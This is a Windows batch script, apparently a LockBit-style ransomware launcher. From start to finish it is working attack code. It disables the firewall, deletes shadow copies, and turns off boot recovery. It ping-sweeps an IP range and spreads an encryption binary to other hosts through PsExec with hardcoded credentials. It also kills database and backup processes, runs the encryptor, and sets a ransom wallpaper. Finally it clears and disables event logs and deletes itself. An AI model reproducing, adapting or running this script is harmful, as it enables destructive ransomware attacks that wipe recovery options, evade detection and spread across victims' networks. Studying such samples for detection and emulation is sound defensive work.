:: LB alternative batch script.
ECHO off
@setlocal enabledelayedexpansion

IF "%~1" == "" GOTO usage
set enc_binary_path=%1
set start_ip=%~2
set end_ip=%~3
set current_ip=%~4

::set start_octets=
set num_start_octets=0
set end_octets=
set num_end_octets=0

set strict_include_hosts="10.111.9.201" "10.111.9.202"

set log_file="C:\Windows\temp\bl.bat.log"

ECHO %DATE% %TIME% >> %log_file%

IF NOT "%~2" == "" (
    IF "%~3" == "" GOTO usage
    
    :: parse out octets (replace . with space)
    for %%a in ("%start_ip:.=" "%") DO (
        set start_octets[!num_start_octets!]=%%~a
        set /A num_start_octets=num_start_octets+1
    )
    IF NOT "!num_start_octets!" EQU "4" (
        ECHO [ERROR] Start IP "%start_ip%" is not a dotted IPv4 address
        EXIT /B 2
    )

    for %%a in ("%end_ip:.=" "%") DO (
        set end_octets[!num_end_octets!]=%%~a
        set /A num_end_octets=num_end_octets+1
    )
    IF NOT "!num_end_octets!" EQU "4" (
        ECHO [ERROR] Start IP "%end_ip%" is not a dotted IPv4 address
        EXIT /B 2
    )
)

:: Perform basic initial discovery
ECHO [INFO] Performing initial discovery
ECHO [INFO] Performing initial discovery >> %log_file%
ECHO [INFO] Current user: >> %log_file%
(whoami 2>&1 || ECHO [ERROR] Failed to get current username) >> %log_file%
ECHO: >> %log_file%

ECHO [INFO] Current hostname: >> %log_file%
(hostname 2>&1 || ECHO [ERROR] Failed to get current hostname) >> %log_file%
ECHO: >> %log_file%

ECHO [INFO] Current domain: >> %log_file%
(ECHO %USERDOMAIN% || ECHO [ERROR] Failed to get current domain) >> %log_file%
ECHO: >> %log_file%

ECHO [INFO] OS architecture: >> %log_file%
(wmic os get osarchitecture 2>&1 || ECHO [ERROR] Failed to get OS architecture) >> %log_file%

ECHO [INFO] OS version: >> %log_file%
(ver 2>&1 || ECHO [ERROR] Failed to get OS version) >> %log_file%
ECHO: >> %log_file%

:: Perform language check
ECHO [INFO] Performing language check
ECHO [INFO] Performing language check >> %log_file%
FOR /F "tokens=*" %%t IN ('reg query HKLM\system\controlset001\control\nls\language /v Installlanguage') DO (
    IF NOT "%%~t" == "" (
        ECHO %%~t >> %log_file%
        FOR /F "tokens=3" %%P IN ("%%~t") DO (
            set install_lang=%%~P
            ECHO [DEBUG] Install language: !install_lang! >> %log_file%
        )
    )
)
FOR /F "tokens=*" %%t IN ('reg query HKLM\system\controlset001\control\nls\language /v Default') DO (
    IF NOT "%%~t" == "" (
        ECHO %%~t >> %log_file%
        FOR /F "tokens=3" %%P IN ("%%~t") DO (
            set default_lang=%%~P
            ECHO [DEBUG] Default language: !default_lang! >> %log_file%
        )
    )
)
FOR %%a IN (
    "2801",
    "0819",
    "042B",
    "0419",
    "742C",
    "0428",
    "782C",
    "042C",
    "0442",
    "0423",
    "0444",
    "0437",
    "0422",
    "043F",
    "0843",
    "0440",
    "0443",
    "0818",
) DO (
    IF "%install_lang%" == "%%~a" (
        ECHO [INFO] Install language found in exclusion list. Terminating. >> %log_file%
        EXIT /B 3
    )
    IF "%default_lang%" == "%%~a" (
        ECHO [INFO] Default language found in exclusion list. Terminating. >> %log_file%
        EXIT /B 3
    )
)
ECHO [INFO] Language check passed. >> %log_file%

:: Disable firewall
ECHO [INFO] Disabling firewall.
ECHO [INFO] Disabling firewall. >> %log_file%
(reg add HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile /v EnableFirewall /d 0 /t REG_DWORD /f 2>&1 && ECHO [DEBUG] disabled domain firewall || ECHO [ERROR] Failed to disable domain firewall) >> %log_file%
(reg add HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile /v EnableFirewall /d 0 /t REG_DWORD /f 2>&1 && ECHO [DEBUG] disabled regular firewall || ECHO [ERROR] Failed to disable regular firewall) >> %log_file%
ECHO: >> %log_file%

:: Delete shadow copies
ECHO [INFO] Deleting shadow copies
ECHO [INFO] Deleting shadow copies >> %log_file%
(vssadmin.exe delete shadows /all /quiet 2>&1 && ECHO [INFO] Deleted shadow copies || ECHO [ERROR] Failed to delete shadow copies)  >> %log_file%
ECHO: >> %log_file%

:: Disable boot recovery
ECHO [INFO] Disabling boot recovery
ECHO [INFO] Setting boot status policy to ignore all failures >> %log_file%
(bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures 2>&1 || ECHO [ERROR] Failed to set boot status policy) >> %log_file%
ECHO: >> %log_file%
ECHO [INFO] Disabling automatic repair at boot >> %log_file%
(bcdedit.exe /set {default} recoveryenabled no 2>&1 || ECHO [ERROR] Failed to disable automatic repair at boot) >> %log_file%
ECHO: >> %log_file%

:: Ping local targets and propagate via psexec if required
IF NOT "%~2" == "" (
    ECHO [INFO] Pinging targets for propagation
    ECHO [INFO] Pinging targets for propagation >> %log_file%
    set num_targets=0
    FOR /L %%a IN (%start_octets[0]%,1,%end_octets[0]%) DO (
        FOR /L %%b IN (%start_octets[1]%,1,%end_octets[1]%) DO (
            FOR /L %%c IN (%start_octets[2]%,1,%end_octets[2]%) DO (
                FOR /L %%d IN (%start_octets[3]%,1,%end_octets[3]%) DO (
                    set target=%%~a.%%~b.%%~c.%%~d
                    IF "%current_ip%" == "!target!" (
                        ECHO [DEBUG] Skipping own IP !target! >> %log_file%
                    ) ELSE (
                        ECHO [DEBUG] Pinging target !target! >> %log_file%
                        set "found="
                        FOR /F "tokens=*" %%t IN ('ping /n 2 /w 1500 !target!') DO (
                            set token=%%t
                            IF NOT defined found (
                                IF NOT "!token:TTL=!" == "!token!" (
                                    set "found=y"
                                    ECHO [INFO] Successful ping response from !target! >> %log_file%
                                )
                            )
                            ECHO %%t >> %log_file%
                        )
                        IF defined found (
                            IF NOT "%strict_include_hosts%" == "" (
                                FOR %%h IN (%strict_include_hosts%) DO ( 
                                    IF %%h == "!target!" (
                                        ECHO [INFO] Found strict-includes target !target! >> %log_file%
                                        set psexec_targets[!num_targets!]=!target!
                                        set /A num_targets=num_targets+1
                                    )
                                )
                            ) ELSE (
                                ECHO [INFO] Found target !target! >> %log_file%
                                set psexec_targets[!num_targets!]=!target!
                                set /A num_targets=num_targets+1
                            )
                        )
                        ECHO: >> %log_file%
                    )
                )
            )
        )
    )

    set /A max_index=num_targets-1

    ECHO [INFO] !num_targets! propagation targets found via ping:
    ECHO [INFO] !num_targets! propagation targets found via ping: >> %log_file%
    FOR /L %%x in (0,1,!max_index!) DO (
        ECHO [INFO]     !psexec_targets[%%x]! >> %log_file%
    )
    ECHO: >> %log_file%

    IF !num_targets! EQU 0 (
        ECHO [INFO] No propagation targets found. Skipping PsExec propagation.
        ECHO [INFO] No propagation targets found. Skipping PsExec propagation. >> %log_file%
    ) ELSE (
        :: Propagate via PsExec
        ECHO [INFO] Propagating via PsExec
        ECHO [INFO] Propagating via PsExec >> %log_file%
        set targets_str=
        FOR /L %%x in (0,1,!max_index!) DO (
            set psexec_target=!psexec_targets[%%x]!
            ECHO [DEBUG] Copying encryption binary to !psexec_target! >> %log_file%
            set targets_str=!targets_str!,!psexec_target!

            (copy /y /b %enc_binary_path% \\!psexec_target!\C$\Windows\Temp\min.exe 2>&1 && ECHO [INFO] Copied encryption binary to !psexec_target! || ECHO [ERROR] Failed to copy %enc_binary_path% to \\!psexec_target!\C$\Windows\Temp) >> %log_file%
        )
        set targets_str=!targets_str:~1!
        ECHO [INFO] Performing PsExec propagation against !targets_str!
        ECHO [INFO] Performing PsExec propagation against !targets_str! >> %log_file%
        PsExec64.exe -accepteula \\!targets_str! -u "decryptmalfoy\\gornuk.da" -p "Frown-Cement" -s -d -f -c %0 "C:\Windows\Temp\min.exe" 2>&1 >> %log_file%
    )
) ELSE (
    ECHO [INFO] Skipping ping sweep and PsExec propagation.
    ECHO [INFO] Skipping ping sweep and PsExec propagation. >> %log_file%
)

:: Kill processes
ECHO [INFO] Killing processes to prepare for encryption
ECHO [INFO] Killing processes to prepare for encryption >> %log_file%
set processes="sql" "oracle" "ocssd" "dbsnmp" "synctime" "agntsvc" "isqlplussvc" "xfssvccon" "mydesktopservice" "ocautoupds" "encsvc" "firefox" "tbirdconfig" "mydesktopqos" "ocomm" "dbeng50" "sqbcoreservice" "scalc" "infopath" "sbase" "onenote" "outlook" "simpres" "steam" "thebat" "thunderbird" "sdraw" "swriter""wordpad" "notepad" "calc" "wuauclt" "onedrive" "soffice"
for %%p in (%processes%) do ( 
   (taskkill /f /im %%p.exe 2>&1) >> %log_file%
)
ECHO: >> %log_file%

:: Terminate and disable services
ECHO [INFO] Terminating and disabling services to prepare for encryption
ECHO [INFO] Terminating and disabling services to prepare for encryption >> %log_file%
set services="vss" "sql" "svc$" "memtas" "mepocs" "msexchange" "veeam" "backup" "GxVss" "GxBlr" "GxFWD" "GxCVD" "GxCIMgr"
for %%s in (%services%) do ( 
   (sc.exe stop %%s && sc.exe config %%s start= disabled 2>&1 && ECHO [DEBUG] Stopped and disabled service %%s) >> %log_file%
)
ECHO: >> %log_file%

:: Clear recycle bin
ECHO [INFO] Emptying recycle bin
ECHO [INFO] Emptying recycle bin >> %log_file%
(rd /q /s %SYSTEMDRIVE%\$Recycle.bin 2>&1 || ECHO [ERROR] Failed to empty recycle bin) >> %log_file%
ECHO:

:: Set encrypted file icon
ECHO [INFO] Setting file icon at %PROGRAMDATA%\sk12uyqzk.ico for encrypted extension.
ECHO [INFO] Setting file icon at %PROGRAMDATA%\sk12uyqzk.ico for encrypted extension. >> %log_file%
(reg add HKCR\.sk12uyqzk /d sk12uyqzk /t REG_SZ /f 2>&1 || ECHO [ERROR] Failed to register extension in registry) >> %log_file%
(reg add HKCR\sk12uyqzk\DefaultIcon /d %PROGRAMDATA%\sk12uyqzk.ico /t REG_SZ /f 2>&1 || ECHO [ERROR] Failed to set default icon for extension) >> %log_file%
ECHO: >> %log_file%

:: Run encryption binary
ECHO [INFO] Running the encryption routine %1:
ECHO [INFO] Running the encryption routine %1: >> %log_file%
%1 2>&1 >> %log_file%
ECHO: >> %log_file%

:: Change wallpaper
ECHO [INFO] Changing wallpaper to %PROGRAMDATA%\sk12uyqzk.bmp
ECHO [INFO] Changing wallpaper to %PROGRAMDATA%\sk12uyqzk.bmp >> %log_file%
(reg add "HKCU\Control Panel\Desktop" /v Wallpaper /d %PROGRAMDATA%\sk12uyqzk.bmp /t REG_SZ /f 2>&1 || ECHO [ERROR] Failed to change wallpaper via registry) >> %log_file%
ECHO: >> %log_file%

:: Clear and disable Event logs
ECHO [INFO] Clearing and disabling Windows event logs
ECHO [INFO] Clearing and disabling Windows event logs >> %log_file%
FOR /F "tokens=*" %%e IN ('wevtutil.exe el') DO (
    (wevtutil.exe cl "%%e" 2>&1 && ECHO [DEBUG] Cleared event log "%%e" || ECHO [ERROR] Failed to clear event log "%%e") >> %log_file%
    (wevtutil.exe sl "%%e" /e:false 2>&1 && ECHO [DEBUG] Disabled event log "%%e" || ECHO [ERROR] Failed to disable event log "%%e") >> %log_file%
)
ECHO: >> %log_file%

:: Self-destruct
ECHO [INFO] Cleaning up encryption executable and performing self destruct
ECHO [INFO] Cleaning up encryption executable and performing self destruct >> %log_file%
(del /f /q %enc_binary_path% 2>&1 || ECHO [ERROR] Failed to delete encryption binary at %enc_binary_path%) >> %log_file%
start "" /B cmd /c "timeout /nobreak 5 & del /f /q %0 2>&1 >> %log_file%"
ECHO: >> %log_file%

EXIT /B


:usage
ECHO Usage: bl.bat path_to_encryption_executable [target_range_start target_range_end [current_ip]]
ECHO first parameter: path to minimal encryption executable
ECHO second parameter: optional, start IP for target range for propagation
ECHO third parameter: required if using second parameter, end IP for target range for propagation
ECHO fourt parameter: option if using second and third parameters, current IP to avoid propagating to self
ECHO example: bl.bat C:\Users\Public\enc.exe "10.0.1.2" "10.0.1.15"
ECHO example: bl.bat C:\Users\Public\enc.exe
EXIT /B 1


